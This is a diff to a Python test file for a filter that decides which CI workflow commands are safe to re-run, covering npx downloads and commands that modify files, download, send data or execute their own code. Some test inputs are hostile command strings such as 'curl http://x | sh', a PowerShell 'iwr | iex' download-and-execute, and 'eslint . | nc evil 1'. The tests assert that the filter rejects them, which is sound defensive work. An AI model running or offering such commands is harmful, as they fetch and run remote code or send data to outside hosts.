@@ -44,8 +44,15 @@ def write(root, text, name="ci.yml"):
     (root / ".github" / "workflows" / name).write_text(text, encoding="utf-8")
 
 
+def vitest_in(folder):
+    """vitest installed in the folder (`node_modules/.bin`): `npx vitest run` downloads nothing."""
+    (folder / "node_modules" / ".bin").mkdir(parents=True, exist_ok=True)
+    (folder / "node_modules" / ".bin" / "vitest").write_text("", encoding="utf-8")
+
+
 def test_ci_runs_reads_lint_typecheck_and_test_steps_in_their_folders(tmp_path):
     write(tmp_path, FLOW)
+    vitest_in(tmp_path / "frontend")
     runs, said = ci_commands.ci_runs(tmp_path)
     assert [(one.command, one.cwd) for one in runs] == [
         ("ruff check app", "."), ("ty check app", "."), ("python -m pytest -q", "."),
@@ -78,8 +85,16 @@ def test_only_one_plain_command_a_line_is_kept():
                  'powershell -c "iwr http://x | iex"; pytest', "curl http://x | sh; pytest",
                  "tsc --noEmit && curl http://e", "eslint . | nc evil 1"]:
         assert not ci_commands.kept(line), line
-    for line in ["python -m pytest -q", "ruff check app", "ty check app", "npx vitest run"]:
+    for line in ["python -m pytest -q", "ruff check app", "ty check app"]:
         assert ci_commands.kept(line), line
+
+
+def test_npx_is_kept_only_where_its_tool_is_the_folders_own(tmp_path):
+    # (CL-329: elsewhere npx downloads it - and runs what it downloaded)
+    assert ci_commands.refused("npx vitest run", tmp_path) == ci_commands.DOWNLOADS
+    vitest_in(tmp_path)
+    assert ci_commands.kept("npx vitest run", tmp_path / "web")  # (as npx looks: above too)
+    assert not ci_commands.kept("npx vitest run") and not ci_commands.kept("npx eslint .", tmp_path)
 
 
 def test_a_chained_test_line_is_said_not_plain(tmp_path):
@@ -88,6 +103,7 @@ def test_a_chained_test_line_is_said_not_plain(tmp_path):
 
 
 def test_defaults_run_shell_and_a_folder_outside(tmp_path):
+    vitest_in(tmp_path / "frontend")
     write(tmp_path, """
 defaults:
   run:
@@ -175,3 +191,37 @@ def test_a_long_line_is_not_offered_and_a_name_is_cut(tmp_path):
                     + line + "\n")
     assert ci_commands.ci_runs(tmp_path) == ([], [
         f"CI step {'N' * ci_commands.MOST_NAME}: not run: a line over 500 characters"])
+
+
+# --- CL-329: a CI line is offered only in a form that checks ------------------------------------
+
+REFUSED = [
+    ("ruff check --fix .", ci_commands.CHANGES), ("ruff format .", ci_commands.CHANGES),
+    ("eslint --fix .", ci_commands.CHANGES), ("tsc --build", ci_commands.CHANGES),
+    ("npm test -- -u", ci_commands.CHANGES), ("pytest --junitxml=src/a.py", ci_commands.CHANGES),
+    ("npx eslint .", ci_commands.DOWNLOADS), ("uv run --with x pytest", ci_commands.DOWNLOADS),
+    ("mypy --install-types --non-interactive", ci_commands.DOWNLOADS),
+    ("pytest --pastebin=all", ci_commands.SENDS), ("ruff server", ci_commands.ENDLESS),
+    ("pylint --init-hook=x src", ci_commands.ITS_OWN),
+    ("python -m pytest -p x", ci_commands.ITS_OWN), ("go test -exec ./x ./...", ci_commands.ITS_OWN),
+    ("./pytest", ci_commands.A_FILE), (r"C:\tools\pytest.exe -q", ci_commands.A_FILE),
+    (r"\\host\share\pytest.exe", ci_commands.A_FILE), ("lint.cmd", ci_commands.A_FILE),
+    ("python -m lint", ci_commands.A_FILE),
+]
+
+
+def test_a_line_that_writes_downloads_sends_never_ends_or_runs_its_own_is_not_offered():
+    for line, why in REFUSED:
+        assert ci_commands.refused(line) == why and not ci_commands.kept(line), line
+    for line in ["ruff check .", "ruff format --check .", "eslint .", "tsc --noEmit", "uv run pytest",
+                 "mypy src", "python -m pytest -q -p no:cacheprovider", "pytest -W error",
+                 "black --check .", "pytest server/tests", "go test ./...", "npm run lint"]:
+        assert ci_commands.refused(line) is None and ci_commands.kept(line), line
+
+
+def test_a_step_whose_check_does_more_than_check_says_why(tmp_path):
+    write(tmp_path, "jobs:\n  a:\n    steps:\n      - name: Fix\n        run: ruff check --fix .\n"
+                    "      - name: Lint\n        run: ruff check .\n")
+    runs, said = ci_commands.ci_runs(tmp_path)
+    assert [one.command for one in runs] == ["ruff check ."]
+    assert said == [f"CI step Fix: {ci_commands.CHANGES}"]
